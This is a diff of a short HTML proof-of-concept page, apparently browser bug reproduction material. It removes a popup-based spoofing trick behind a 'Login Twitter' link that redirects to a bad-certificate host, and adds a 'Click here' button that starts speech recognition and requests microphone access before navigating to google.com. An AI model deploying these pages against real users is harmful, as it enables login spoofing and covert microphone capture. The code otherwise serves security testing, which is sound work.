@@ -1,12 +1,11 @@
+<input onclick="start()" type="button" value="Click here" />
+
 <script>
-  function next() {
-         w.location.replace('http://wrong.host.badssl.com/');
-        }
-
-  function f() {
-    w = window.open("javascript:document.write('spoof');location='http://twitter.com'","new","width=500 height=500");
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  function start(){
+   var recognition = new webkitSpeechRecognition();
+  recognition.start();
+  navigator.webkitGetUserMedia({audio: true}, function(){}, function(){});
+  document.location = "https://www.google.com"
   }
-</script>
 
-<a href="#" onclick="f()">Login Twitter</a>
+  </script>
